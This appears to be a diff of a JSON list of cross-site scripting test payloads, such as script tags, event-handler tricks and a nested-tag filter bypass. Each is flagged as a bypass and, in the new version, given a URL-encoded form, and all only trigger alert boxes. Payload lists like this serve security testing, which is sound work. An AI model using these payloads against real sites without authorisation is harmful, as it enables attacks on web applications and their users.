@@ -1,57 +1,38 @@
 [
   {
-    "type": "DOM",
-    "payload": "<script>alert(1)</script>",
-    "bypass": true
+    "Type": "Reflected",
+    "Payload": "<script>alert(1)</script>",
+    "Bypass": true,
+    "Encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
   },
   {
-    "type": "DOM",
-    "payload": "<img src=x onerror=alert(1)>",
-    "bypass": true
+    "Type": "Stored",
+    "Payload": "<input autofocus onfocus=alert(1)>",
+    "Bypass": true,
+    "Encoded": "%3Cinput+autofocus+onfocus%3Dalert%281%29%3E"
   },
   {
-    "type": "DOM",
-    "payload": "<svg onload=confirm(1)>",
-    "bypass": true
+    "Type": "DOM",
+    "Payload": "<img src=x onerror=alert(1)>",
+    "Bypass": true,
+    "Encoded": "%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"
   },
   {
-    "type": "DOM",
-    "payload": "<a href=\"javascript:prompt(1)\">click</a>",
-    "bypass": true
+    "Type": "Reflected",
+    "Payload": "<iframe srcdoc=\"<script>alert(2)</script>\">",
+    "Bypass": true,
+    "Encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E"
   },
   {
-    "type": "DOM",
-    "payload": "<body onclick=alert(1)>",
-    "bypass": true
+    "Type": "Stored",
+    "Payload": "<body onload=alert(2)>",
+    "Bypass": true,
+    "Encoded": "%3Cbody+onload%3Dalert%282%29%3E"
   },
   {
-    "type": "DOM",
-    "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
-    "bypass": true
-  },
-  {
-    "type": "DOM",
-    "payload": "<input autofocus onfocus=confirm(1)>",
-    "bypass": true
-  },
-  {
-    "type": "DOM",
-    "payload": "<math href=\"javascript:prompt(1)\">CLICK</math>",
-    "bypass": true
-  },
-  {
-    "type": "DOM",
-    "payload": "<details open ontoggle=alert(1)>",
-    "bypass": true
-  },
-  {
-    "type": "DOM",
-    "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
-    "bypass": true
-  },
-  {
-    "type": "DOM",
-    "payload": "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",
-    "bypass": true
+    "Type": "DOM",
+    "Payload": "<scr<script>ipt>alert(2)</scr</script>ipt>",
+    "Bypass": true,
+    "Encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
   }
 ]
